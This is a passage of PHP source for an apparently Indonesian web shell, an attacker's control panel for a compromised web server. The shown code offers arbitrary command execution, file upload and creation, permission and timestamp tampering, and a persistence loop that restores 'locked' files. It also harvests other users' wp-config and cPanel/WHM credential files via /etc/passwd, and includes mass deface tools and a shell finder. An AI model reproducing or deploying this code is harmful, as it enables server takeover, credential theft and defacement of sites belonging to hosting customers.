    <textarea type="text" cols=120 id="myInput" rows=30 name="src">'.htmlspecialchars(@file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="pilih" value="edit"></form><br></td></thead></table><br>';
    exit();
}

// ---- CHMOD FILE ----
if (isset($_GET['pilihan']) && $_POST['pilih'] == "chmod") {
    $files = basename($_POST['path']);
    $izin = substr(sprintf('%o', fileperms($_POST['path'])), -4);
    echo "<table class='directory-listing-table'><td><center><font color='#fff'>Filename : <font color='orange'>$files</font> ($izin)<br><br>
    <form method='post'><div class='input-group mb-3' style='width:230px;'><input type='text' name='mod1' class='form-control' maxlength='4' value='".$_POST['mod1']."' placeholder='0644' required/>
    <input type='hidden' name='path' value='".$_POST['path']."'><input type='hidden' name='pilih' value='chmod'>
    <br><br><button type='submit' class='btn btn-outline-light mb-1' name='ganti' value='ganti'>Change</button></div></form></td></table>";
    if (isset($_POST['ganti'])) {
        $opet = @chmod($_POST['path'], octdec($_POST['mod1']));
        if ($opet == true) echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>";
        else echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle'></i> Failed to change!!</font></center></td></table>";
    }
    exit();
}

// ---- CHMOD FOLDER ----
if (isset($_GET['pilihan']) && $_POST['pilih'] == "chmodf") {
    $files = basename($_POST['path']);
    $izin = substr(sprintf('%o', fileperms($_POST['path'])), -4);
    echo "<table class='directory-listing-table'><td><br><center><font color='#fff'>Folder : <font color='orange'>$files</font> ($izin)<br><br>
    <form method='post'><div class='input-group mb-3' style='width:230px;'><input type='text' name='mod1' maxlength='4' class='form-control' value='".$_POST['mod1']."' placeholder='0755' required/>
    <input type='hidden' name='path' value='".$_POST['path']."'><input type='hidden' name='pilih' value='chmodf'>
    <button type='submit' class='btn btn-outline-light mb-1' name='ganti' value='ganti'>Change</button></div></form></td></table>";
    if (isset($_POST['ganti'])) {
        $opet = @chmod($_POST['path'], octdec($_POST['mod1']));
        if ($opet == true) echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>";
        else echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle'></i> Failed to change!!</font></center></td></table>";
    }
    exit();
}

// ---- CHDATE FILE ----
if (isset($_GET['pilihan']) && $_POST['pilih'] == "chdate") {
    $filedate = basename($_POST['path']);
    $tgl = date("F d Y g:i:s", filemtime($_POST['path']));
    echo "<table class='directory-listing-table'><td><form method='post'><center><font color='#fff'>Ubah Tanggal<br>File :</font> <font color='orange'>$filedate <br></font>$tgl <br><br>
    <div class='input-group mb-3' style='width:300px;'><input name='tanggal' type='text' class='form-control' value='".$_POST['tanggal']."' placeholder='$tgl'/>
    <input type='hidden' name='path' value='".$_POST['path']."'><input type='hidden' name='pilih' value='chdate'>
    <button type='submit' class='btn btn-outline-light mb-1' name='change' value='change'>Change</button></div></form></center></td></table>";
    if (isset($_POST['change'])) {
        $tanggal = strtotime($_POST['tanggal']);
        if (@touch($_POST['path'], $tanggal) == true) echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>";
        else echo "<br><table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle'></i> Failed to change date!!</td></table>";
    }
    exit();
}

// ---- CHDATE FOLDER ----
if (isset($_GET['pilihan']) && $_POST['pilih'] == "chdatef") {
    $filedate = basename($_POST['path']);
    $tgl = date("F d Y g:i:s", filemtime($_POST['path']));
    echo "<table class='directory-listing-table'><td><form method='post'><center><font color='#fff'>Ubah Tanggal<br>Folder :</font> <font color='orange'>$filedate</font> <br>$tgl<br><br>
    <div class='input-group mb-3' style='width:280px;'><input name='tanggal' type='text' class='form-control' value='".$_POST['tanggal']."' placeholder='$tgl'/>
    <input type='hidden' name='path' value='".$_POST['path']."'><input type='hidden' name='pilih' value='chdatef'>
    <button type='submit' class='btn btn-outline-light mb-1' name='change' value='change'>Change</button></div></form></center></td></table>";
    if (isset($_POST['change'])) {
        $tanggal = strtotime($_POST['tanggal']);
        if (@touch($_POST['path'], $tanggal) == true) echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>";
        else echo "<br><table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle'></i> Failed to change date!!</td></table>";
    }
    exit();
}

// ---- UNZIP ----
if (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
    $file = $_POST['path'];
    if (!is_readable($file)) {
        echo "<table class='directory-listing-table' style='color:orange;'><td><font color='orange'>Cannot Unzip File / Unreadable File !</font></td></table>";
    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><i class='fa fa-exclamation-triangle'></i> This isn't Zip File</font></td></table>";
    } else {
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive;
            $res = $zip->open($file);
            if ($res == true) {
                $zip->extractTo($serlok);
                $zip->close();
                echo "<table class='directory-listing-table' style='border-color:lime;'><td>Unzip File Successfully => <font color='lime'>".basename($_POST['path'])."</font><br> Extract to : <font color='aqua'>".$file."</font></td></table>";
            } else {
                echo "<table class='directory-listing-table' style='border-color:red;'><td><i class='fa fa-exclamation-triangle'></i> Failed to Unzip File!!</font></td></table>";
            }
        } else {
            echo "<table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'>ZipArchive not aIndonesianHackerRulezlable</font></td></table>";
        }
    }
    exit();
}

// ---- TOOLS MENU ----
if ($_GET[net('tool')] == "opet") {
    echo '<table class="directory-listing-table"><thead><td><center><font color=orange>Select Tools</font><hr>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("grab_config").'=opet"><i class="fa fa-database"></i> Grab Config</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("hashiden").'=opet"><i class="fa fa-hashtag"></i> Hash Identifier</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("ner").'=opet"><i class="fa fa-database"></i> Adminer</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("massdef").'=opet"><i class="fa fa-bullhorn"></i> Mass Deface</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("scanshell").'=opet"><i class="fa fa-search"></i> Shell Finder V2</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("lokfile").'=opet"><i class="fa fa-lock"></i> Lock File</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("symlink_scanner").'=opet"><i class="fa fa-link"></i> Symlink Scanner</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("user_jump").'=opet"><i class="fa fa-users"></i> User Jump</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("masschmod").'=opet"><i class="fa fa-gears"></i> Mass Chmod</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("massspread").'=opet"><i class="fa fa-copy"></i> Mass Spread V2</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("htaccess").'=opet"><i class="fa fa-lock"></i> HTAccess</button>
    <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("wpcreate").'=opet"><i class="fa fa-wordpress"></i> WP Admin</button>
    <hr>&nbsp;';
    exit();
}

// ---- CONSOLE/CMD ----
if ($_GET[net('cmd')] == "opet") {
    echo "<table class='directory-listing-table'><td>";
    echo '<br><form method="post"><center><div class="input-group" style="width:600px;"><span class="input-group-text mb-1">Command :</span>
    <input type="text" class="form-control" name="komen" id="comandnya" value="'.$_POST['komen'].'" placeholder="uname -a" required>
    <button type="submit" name="comandeks" value="execute" class="btn btn-outline-light mb-1">>></button></div></form><br><center>';
    if (isset($_POST['comandeks'])) ekse($_POST['komen'], $serlok);
    echo "</center></td></table><br></center>";
    exit();
}

// ---- UPLOAD PAGE ----
if ($_REQUEST[net('upload')] == "opet") {
    echo "<table class='directory-listing-table'><td><center>
    <h5><i class='fa fa-upload'></i> UPLOAD FILES</h5><hr>
    <form method='POST' enctype='multipart/form-data'>
    <div class='input-group' style='width:360px;'>
    <input type='file' name='file_upload' id='file_upload' style='background-color: grey;' class='form-control'>
    <input type='submit' class='btn btn-outline-light' name='upload_submit' value='Upload'>
    </div>
    </form>
    <br><font color='orange'>Note: Jika upload gagal (0KB), coba gunakan metode lain.</font>
    </center></td></table>";
    exit();
}

// ---- INFO ----
if ($_REQUEST[net('info')] == "opet") {
    echo "<table class='directory-listing-table' align='center'><div id='content'><tr><td>";
    echo "Server : <font color=orange>".$_SERVER['HTTP_HOST']."</font><br>";
    echo "Server IP : <font color=orange>".($_SERVER['SERVER_ADDR']??'unknown')."</font><br>";
    echo "Your IP : <font color=orange>".$_SERVER['REMOTE_ADDR']."</font><br>";
    echo "Web Server : <font color='orange'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
    echo "System : <font color='orange'>".php_uname()."</font><br>";
    echo "User : <font color='orange'>".@get_current_user()."</font> (<font color='orange'>".@getmyuid()."</font>)<br>";
    echo "PHP Version : <font color='orange'>".@phpversion()."</font> => <font color='orange'>".php_sapi_name()."</font><br>";
    echo "Disable Function : ".($disfunc? "<font color='red'>$disfunc</font>" : "<font color='lime'>AMAN</font>")."</font>";
    echo "</div></tr></td><tr><td><hr>";
    $extensions = ['oci_connect'=>'Oracle','ssh2_connect'=>'SSH2','mysql_connect'=>'MySQL','curl_init'=>'cURL'];
    foreach($extensions as $func => $name) {
        echo $name." : ".(function_exists($func)?"<font color=lime>ON</font>":"<font color=red>OFF</font>")." &nbsp;| ";
    }
    echo "WGET : ".(file_exists("/usr/bin/wget")?"<font color=lime>ON</font>":"<font color=red>OFF</font>")." &nbsp;| ";
    echo "Perl : ".(file_exists("/usr/bin/perl")?"<font color=lime>ON</font>":"<font color=red>OFF</font>")." &nbsp;| ";
    echo "Python : ".(file_exists("/usr/bin/python2")?"<font color=lime>ON</font>":"<font color=red>OFF</font>")."<br>";
    $pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
    echo "PKEXEC : $pkexec<br><br>";
    echo "--- Terminal Functions ---<br>";
    foreach ($functions as $func) {
        echo $func . " : " . (fungsi_tersedia($func) ? "<font color=lime>✅ AIndonesianHackerRulezlable</font>" : "<font color=red>❌ Disabled</font>") . "<br>";
    }
    echo "</tr></td></table><br>";
    exit();
}

// ---- CREATE FILE ----
if ($_REQUEST[net('buatfile')] == "opet") {
    if(!isset($_POST['bikin'])) {
        echo "<center><table class='directory-listing-table'><td width='12%''><form method='POST'>
        <input type='text' value='file.php' placeholder='Nama File' style='width: 525px;' name='new_file' autocomplete='off'><br><br>
        <textarea name='isi_file' rows='20' cols='100' placeholder='Hello World!'></textarea><br>
        <button type='sumbit' class='btn btn-outline-light' style='width:200px; height:36px;' name='bikin'>CREATE</button>
        <a href='?path=".$serlok."' class='btn btn-outline-light'>Back</a><br></form></center>";
    } else {
        $pat = $_GET['path'];
        $nama_file = $_POST['new_file'];
        $isi_file = $_POST['isi_file'];
        $handle = fopen("$pat/$nama_file", 'w');
        $files = $_GET['path']."/".$nama_file;
        $asu = str_replace($_SERVER['DOCUMENT_ROOT'], $web. "", $files);
        if (fwrite($handle, $isi_file)) echo '<table class="directory-listing-table" style="border-color:lime;"><td>Created => <font color="lime">'.$pat.'/'.$nama_file.'<br></font>Link : <a href="'.$asu.'" target="_blank"><font color="aqua">Click here</a></font></td></table>';
        else echo '<table class="directory-listing-table" style="border-color:red;"><td><font color=red><i class="fa fa-exclamation-triangle"></i> Failed to create file..!!</font></td></table>';
    }
    exit();
}

// ---- CREATE FOLDER ----
if ($_GET[net('buatfolder')] == "opet") {
    if (!isset($_POST['submit'])) {
        echo '<table class="directory-listing-table"><td><form action="" method="POST"><h5><i class="fa fa-folder-plus"></i> Create Folder</h5><hr><center>
        <div style="width:300px;"><input type="text" class="form-control" placeholder="Folder Name" name="new_folder" id="add"/><br></div>
        <button type="submit" class="btn btn-outline-light" name="submit" value="Create directory" style="width:120px;">Create</button>
        <a href="?path='.$serlok.'" class="btn btn-outline-light" style="width:120px;">Back</a><br><br></form></td></table>';
    } else {
        if (empty($_POST['new_folder'])) {
            echo '<table class="directory-listing-table" style="border-color:orange;"><td><font color="orange">Folder field is required</font> [<a href="?path='.$_GET['path'].'&'.net("buatfolder").'=opet"><i class="fa fa-folder-plus"></i>Create again</a>]</td></table>';
        } else {
            $add = $_POST["new_folder"];
            $backdoor = mkdir($_GET['path']."/".$add, 0755, true);
            if ($backdoor == true) echo "<table class='directory-listing-table' style='border-color:lime;'><td>Created => <font color=lime> ".$_GET['path']."/</font><font color='orange'>$add</font><br><a href='?path=".$_GET['path']."/$add'><u>Click Here</u></a></td></table>";
            else echo "<table class='directory-listing-table' style='border-color:red;'><td><font color=red><i class='fa fa-exclamation-triangle'></i> Failed to create folder : $add</font></td></table>";
        }
    }
    exit();
}

// ---- LOCK FILE ----
if ($_REQUEST[net('lokfile')] == "opet") {
    echo "<table class='directory-listing-table'><td><h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='backdoor-text' style='font-size:12px;'><i> Linux</i></font></h5><hr>
    <center><form method='post'><div class='input-group' style='width:300px;'><span class='input-group-text mb-2'>Filename :</span>
    <input type='text' name='pile' class='form-control mb-2' placeholder='file.php'/></div><br>
    <button type='sumbit' class='btn btn-outline-light' style='width:120px;' name='submit'>Submit</button>&nbsp;
    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a></form><br></td></table>";
    if (isset($_POST['submit'])) {
        if (empty($_POST['pile'])) echo "<br><table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center>The File field is required</center></font></td></table>";
        else {
            $filez = $_POST['pile'];
            $tempe = "/tmp";
            if (file_exists($tempe.'/'.md5($serlok. $filez.'-xbackdoor').backdoor_ex($filez).'xhand.Lock') && file_exists($tempe . '/'.backdoor_ex($filez).'-xopet')) {
                cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xopet').backdoor_ex($filez).'xbackdoor.Lock', $serlok);
                cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xbackdoor').backdoor_ex($filez).'xhand.Lock', $serlok);
            }
            cmd("cp $filez ".$tempe."/".md5($serlok. $filez.'-xopet').backdoor_ex($filez).'xbackdoor.Lock', $serlok);
            @chmod($filez, 0444);
            $content = '<?php $tmp = "/tmp"; $fileperm = backdoor_perm("'.$filez.'"); backdoor_cmd("chmod 444 '.$filez.'"); while (True) { if (!file_exists("'.$filez.'")) { $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok. $filez.'-xopet').backdoor_ex($filez).'xbackdoor.Lock")); FiLe_pUt_ConTentS("'.$filez.'", base64_decode($var)); } if ($fileperm != "0444"){ backdoor_cmd("chmod 444 '.$filez.'"); } } function backdoor_cmd($value) { if (function_exists("system")) { sYsTem($value); } else if (function_exists("shell_exec")) { return ShEll_eXeC($value); } else if (function_exists("exec")) { return ExEc($value); } else if (function_exists("passthru")) { return pAsSThRu($value); } } function backdoor_perm($filez){ return substr(sprintf("%o", fileperms($filez)), -4); }';
            $content = file_put_contents($tempe. "/" .md5($serlok. $filez.'-xbackdoor'). backdoor_ex($filez).'xhand.Lock', $content);
            if ($content) {
                echo "<table class='directory-listing-table' style='border-color:lime;'><td>Locked => <font color='lime'>$filez</font></td></table>";
                cmd('php '. $tempe . '/' .md5($serlok. $filez.'-xbackdoor').backdoor_ex($filez).'"xhand.Lock" > /dev/null 2>/dev/null &', $serlok);
            } else {
                echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><i class='fa fa-exclamation-triangle'></i> Can't lock $filez</font></td></table>";
            }
        }
    }
    exit();
}

// ---- HASH IDENTIFIER ----
if ($_GET[net('hashiden')] == "opet") {
    echo "<table class='directory-listing-table'><td><h5>Hash Identifier</h5>Identify and detect unknown hashes using this tool.<hr>
    <form method='POST'><div class='input-group' style='width:650px;'><span class='input-group-text mb-2'>Your hash :</span>
    <input type='text' name='hash' class='form-control mb-2' placeholder='write here'></div><br>
    <button type='submit' name='submit' class='btn btn-outline-light'>Submit & identify</button>
    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light'>Back</a></form></td></table><br>";
    if (isset($_POST['submit'])) {
        if (empty($_POST['hash'])) echo "<table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle'></i> The Hashes field is required</font></center></td></table>";
        else {
            $hash = $_POST['hash'];
            $algorithms = [
                '<font color="lime">MD5' => '/^[a-f0-9]{32}$/i',
                '<font color="lime">SHA1' => '/^[a-f0-9]{40}$/i',
                '<font color="lime">SHA224, Keccak-224' => '/^[a-f0-9]{56}$/i',
                '<font color="lime">SHA256' => '/^[a-f0-9]{64}$/i',
                '<font color="lime">SHA512' => '/^[a-f0-9]{128}$/i',
                '<font color="lime">Bcrypt' => '/^\$2y\$[0-9]{2}\$[A-Za-z0-9\.\/]{53}$/',
                '<font color="lime">Argon2i' => '/^\$argon2i\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9\/+]{43,}\$[A-Za-z0-9\/+]{43,}$/',
            ];
            $found = 'Could not identify / Tidak dapat mengidentifikasi';
            foreach ($algorithms as $name => $pattern) {
                if (preg_match($pattern, $hash)) { $found = $name; break; }
            }
            echo "<table class='directory-listing-table'><td>Hash : <font color='lime'>$hash\n</font><br>Algorithms : $found</font></td></table>";
        }
    }
    exit();
}

// ---- GRAB CONFIG ----
if ($_GET[net('grab_config')] == "opet") {
    @ini_set('max_execution_time',0);
    echo '<table class="directory-listing-table"><thead><td><center>Config Grabber<br><br><form method="POST"><textarea cols="100" name="passwd" rows="25">';
    if (file_exists('/etc/passwd')) {
        $uSr=file("/etc/passwd");
        foreach($uSr as $usrr) { $str=explode(":",$usrr); echo $str[0]."\n"; }
    }
    echo'</textarea><br><input type="hidden" class="input" name="folfig" value="backdoorcfg"/>
    <select class="form-select form-select-sm" style="width:150px;"><option>select menu</option>
    <option value=".txt">.txt</option><option value=".php">.php</option><option value=".shtml">.shtml</option>
    <option value=".ini">.ini</option><option value=".html">.html</option></select><br>
    <input name="conf" style="width:100px;" class="btn btn-outline-light" value="submit" type="submit"></td></thead></table></form></center><br>';
}
if(isset($_POST['conf'])) {
    $folfig = $_POST['folfig'];
    @mkdir($folfig, 0755);
    @chdir($folfig);
    $htaccess="Options Indexes FollowSymLinks \nDirectoryIndex .my.cnf \nAddType txt .php \nAddType txt .my.cnf \nAddType txt .accesshash \nAddHandler txt .php \nAddHandler txt .cnf \nAddHandler txt .accesshash ";
    file_put_contents(".htaccess",$htaccess,FILE_APPEND);
    $passwd=explode("\n",$_POST["passwd"]);
    foreach($passwd as $pwd){
        $user=trim($pwd);
        $targets = [
            '/public_html/wp-config.php' => 'WORDPRESS.txt',
            '/public_html/configuration.php' => 'WHMCS_JOOMLA.txt',
            '/public_html/app/etc/local.xml' => 'MAGENTO.txt',
            '/public_html/config/settings.inc.php' => 'PRESTASHOP.txt',
            '/public_html/application/config/database.php' => 'ELLISLAB.txt',
            '/public_html/admin/config.php' => 'OPENCART.txt',
            '/public_html/default/settings.php' => 'DRUPAL.txt',
            '/public_html/forum/config.php' => 'PHPBB.txt',
            '/public_html/vb/includes/config.php' => 'VBULLETIN.txt',
            '/public_html/includes/config.php' => 'VBULLETIN.txt',
            '/public_html/.my.cnf' => 'cpanel.txt',
            '/public_html/.accesshash' => 'whm.txt',
        ];
        foreach($targets as $path => $label) {
            $source = '/home/'.$user.$path;
            if(file_exists($source)) {
                @copy($source, $user.$label);
                @symlink($source, $user.'symlink_'.$label);
            }
            for($i=1;$i<=7;$i++) {
                $source2 = '/home'.$i.$user.$path;
                if(file_exists($source2)) {
                    @copy($source2, $user.$i.$label);
                    @symlink($source2, $user.$i.'symlink_'.$label);
                }
            }
        }
    }
    echo '<table class="directory-listing-table"><thead><td><center>Done => <a href='.$folfig.' target="_blank" class="button">Click Here</a></center></td></thead></table><br>';
    exit();
}

// ---- SHELL FINDER V2 - SCAN TERBARU DENGAN CENTANG ----
if ($_GET[net('scanshell')] == "opet") {
    echo "<center><table class='directory-listing-table'><td>
    <h5><i class='fa fa-search'></i> Shell Finder V2 - Scan Files Terbaru</h5><hr>
    <form method='POST'>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Extension :</span>
    <input type='text' name='ext' class='form-control' placeholder='php' value='php'></div>
    <div class='input-group' style='width:550px;'><span class='input-group-text mb-2'>Directory :</span>
    <input type='text' name='dir_path' class='form-control' value='$serlok'></div>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Max Files :</span>
    <input type='number' name='max_files' class='form-control' value='100'></div>
    <div class='input-group' style='width:350px;'><span class='input-group-text mb-2'>Days Back :</span>
    <input type='number' name='days_back' class='form-control' value='7' placeholder='7 hari terakhir'></div>
    <button type='submit' name='scan_submit' class='btn btn-outline-light' style='width:120px;'>Scan</button>
    <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a>
    </form></td></table><br>";

    if(isset($_POST['scan_submit'])) {
        $dir = $_POST['dir_path'];
        $ext = $_POST['ext'];
        $max_files = isset($_POST['max_files']) ? (int)$_POST['max_files'] : 100;
        $days_back = isset($_POST['days_back']) ? (int)$_POST['days_back'] : 7;
        $cutoff_time = time() - ($days_back * 86400);
        
        $results = [];
        
        if(!empty($dir) && is_dir($dir)) {
            $rdi = new RecursiveDirectoryIterator($dir);
            $files_list = [];
            foreach (new RecursiveIteratorIterator($rdi) as $filename => $file) {
                if ($file->isFile() && pathinfo($filename, PATHINFO_EXTENSION) == $ext) {
                    $mtime = filemtime($filename);
                    if ($mtime >= $cutoff_time) {
                        $files_list[] = [
                            'path' => $filename,
                            'mtime' => $mtime,
                            'size' => filesize($filename),
                            'content' => file_get_contents($filename)
                        ];
                    }
                }
            }
            
            // Urutkan berdasarkan waktu terbaru
            usort($files_list, function($a, $b) {
                return $b['mtime'] - $a['mtime'];
            });
            
            // Batasi jumlah
            $files_list = array_slice($files_list, 0, $max_files);
            
            $patterns = ['eval','base64_decode','str_rot13','mass_deface','addrdp','@exec','@passthru','@chmod','#exec','deface','shell_exec','wget','gsocket','backdoor','backconnect','php_uname','Alfa-Team','ALFA_DATA','MARIJUANA','IndoSec','alfashell','php-obfuscator','featureShell','move_upload_file','symlink','proc_open','popen','system','passthru','assert','create_function','preg_replace','file_put_contents','curl_exec'];
            
            foreach ($files_list as $file_data) {
                $found_patterns = [];
                foreach ($patterns as $pattern) {
                    if (preg_match('/' . preg_quote($pattern, '/') . '\s*\(/i', $file_data['content'])) {
                        $found_patterns[] = $pattern;
                    }
                }
                if (!empty($found_patterns)) {
                    $results[] = [
                        'path' => $file_data['path'],
                        'mtime' => $file_data['mtime'],
                        'size' => $file_data['size'],
                        'patterns' => $found_patterns
                    ];
                }
            }
        }

        // Tampilkan hasil dengan checkbox
        echo "<table class='directory-listing-table'><td>";
        echo "<form method='POST' action='?pilihan&path=".urlencode($serlok)."'>";
        echo "<h6>Found <font color='lime'>" . count($results) . "</font> suspicious files in last <font color='orange'>$days_back</font> days</h6>";
        echo "<div style='max-height:500px;overflow-y:auto;'>";
        
        if (!empty($results)) {
            echo "<table class='table table-dark table-striped'>";
            echo "<thead><tr><th><input type='checkbox' id='select-all' onclick='toggleAll(this)'></th><th>File</th><th>Modified</th><th>Size</th><th>Patterns</th><th>Action</th></tr></thead>";
            echo "<tbody>";
            foreach ($results as $r) {
                $rel_path = str_replace($dir, '', $r['path']);
                $mtime_str = date('Y-m-d H:i:s', $r['mtime']);
                $size_str = humanSize($r['size']);
                $pattern_str = implode(', ', array_slice($r['patterns'], 0, 3));
                if (count($r['patterns']) > 3) $pattern_str .= ' +' . (count($r['patterns']) - 3);
                
                echo "<tr>";
                echo "<td><input type='checkbox' name='files_to_delete[]' value='" . h($r['path']) . "' class='file-checkbox'></td>";
                echo "<td><a href='?viewfile=" . urlencode($r['path']) . "&path=" . urlencode($serlok) . "' target='_blank'>" . h(basename($r['path'])) . "</a><br><span style='font-size:10px;color:#64748b;'>" . h($rel_path) . "</span></td>";
                echo "<td><font color='aqua'>" . $mtime_str . "</font></td>";
                echo "<td>" . $size_str . "</td>";
                echo "<td><font color='orange'>" . $pattern_str . "</font></td>";
                echo "<td>
                    <a href='?viewfile=" . urlencode($r['path']) . "&path=" . urlencode($serlok) . "' target='_blank' class='btn btn-sm btn-outline-light'><i class='fa fa-eye'></i></a>
                    <a href='?path=" . urlencode(dirname($r['path'])) . "' class='btn btn-sm btn-outline-light'><i class='fa fa-folder'></i></a>
                </td>";
                echo "</tr>";
            }
            echo "</tbody></table>";
            echo "<div class='d-flex gap-2 mt-2'>";
            echo "<button type='submit' name='pilih' value='hapus_terpilih' class='btn btn-danger' onclick='return confirmDelete()'><i class='fa fa-trash'></i> Delete Selected</button>";
            echo "<span id='selected-count'>0 file dipilih</span>";
            echo "</div>";
        } else {
            echo "<font color='lime'>No suspicious files found in the last $days_back days.</font>";
        }
        
        echo "</div></form></td></table><br>";
        
        // JavaScript untuk checkbox
        echo '<script>
        function toggleAll(master) {
            var checkboxes = document.getElementsByClassName("file-checkbox");
            for (var i = 0; i < checkboxes.length; i++) {
                checkboxes[i].checked = master.checked;
            }
            updateCount();
        }
        function updateCount() {
            var checkboxes = document.getElementsByClassName("file-checkbox");
            var count = 0;
            for (var i = 0; i < checkboxes.length; i++) {
                if (checkboxes[i].checked) count++;
            }
            document.getElementById("selected-count").innerText = count + " file dipilih";
        }
        function confirmDelete() {
            var checkboxes = document.getElementsByClassName("file-checkbox");
            var count = 0;
            for (var i = 0; i < checkboxes.length; i++) {
                if (checkboxes[i].checked) count++;
            }
            if (count === 0) {
                alert("Pilih minimal satu file untuk dihapus.");
                return false;
            }
            return confirm("Yakin ingin menghapus " + count + " file?");
        }
        document.addEventListener("change", function(e) {
            if (e.target.classList && e.target.classList.contains("file-checkbox")) {
                updateCount();
            }
        });
        updateCount();
        </script>';
    }
    exit();
}

// ---- DELETE SELECTED FILES FROM SCAN ----
if (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus_terpilih") {
    if (isset($_POST['files_to_delete']) && is_array($_POST['files_to_delete'])) {
        $deleted = 0;
        $errors = [];
        foreach ($_POST['files_to_delete'] as $file) {
            $file = realpath($file);
            if ($file && is_file($file)) {
                if (@unlink($file)) $deleted++;
                else $errors[] = $file;
            }
        }
        echo "<table class='directory-listing-table' style='border-color:" . ($errors ? 'orange' : 'lime') . ";'><td>";
        if ($deleted > 0) echo "Deleted <font color='lime'>$deleted</font> file(s).<br>";
        if (!empty($errors)) echo "Errors on: <font color='red'>" . implode(', ', array_slice($errors, 0, 5)) . "</font>";
        echo "</td></table>";
    }
    exit();
}

// ---- MASS DEFACE ----
if ($_REQUEST[net('massdef')] == "opet") {
    if($_POST['start']) {
        $d_dir = $_POST['d_dir'];
        $d_file = $_POST['d_file'];
        $script = $_POST['script'];
        $tipe = $_POST['tipe_sabun'];
        echo "<table class='directory-listing-table'><td>";
        $rdi = new RecursiveDirectoryIterator($d_dir);
        foreach (new RecursiveIteratorIterator($rdi) as $dir => $file) {
            if($file->isDir()) {
                $path = $dir.'/'.$d_file;
                if(is_writable($dir)) {
                    echo "[<font color=lime>DONE</font>] $dir<br>";
                    file_put_contents($path, $script);
                }
            }
        }
        echo "</td></table></div>";
    } else {
        echo "<table class='directory-listing-table'><td><form method='post'>
        <div class='form-check-inline mb-2'><input type='radio' name='tipe_sabun' id='biasa' class='form-check-input' value='murah' checked>
        <label class='form-check-label' for='inlineRadio1'>Biasa</label></div>
        <div class='form-check form-check-inline'><input type='radio' name='tipe_sabun' class='form-check-input' value='mahal'>
        <label class='form-check-label'>Massal</label></div>
        <div class='input-group' style='width:430px;'><span class='input-group-text mb-1'>Files :</span>
        <input type='text' name='d_file' class='form-control' placeholder='file.html'></div>
        <div class='input-group' style='width:750px;'><span class='input-group-text mb-1'>Path :</span>
        <input type='text' name='d_dir' class='form-control' value='$serlok'></div>
        <textarea name='script' class='form-control' style='width: 750px; height: 300px;' placeholder='Hello Word!'></textarea><br>
        <button type='submit' name='start' value='start' class='btn btn-outline-light' style='width: 300px;'>submit</button>
        <a href='?path=$serlok&".net('tool')."=opet' class='btn btn-outline-light' style='width: 300px;'>Back</a></form></td></table>";
    }
    exit();
}

// ---- ADMINER ----
if ($_REQUEST[net('ner')] == "opet") {
    function crot($url){
        $backdoor = curl_init($url);
        curl_setopt($backdoor, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($backdoor, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($backdoor, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($backdoor, CURLOPT_HEADER, 0);
        return curl_exec($backdoor);
        curl_close($backdoor);
    }
    echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database'></i> Adminer<font class='backdoor-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr><center>
    <form method='POST'><div class='input-group' style='width:300px;'><span class='input-group-text mb-2'>Filename :</span>
    <input type='text' placeholder='adminer.php' class='form-control mb-2' name='miner'></div><br>
    <button type='sumbit' class='btn btn-outline-light' name='gass' style='width:120px;'>Submit</button>
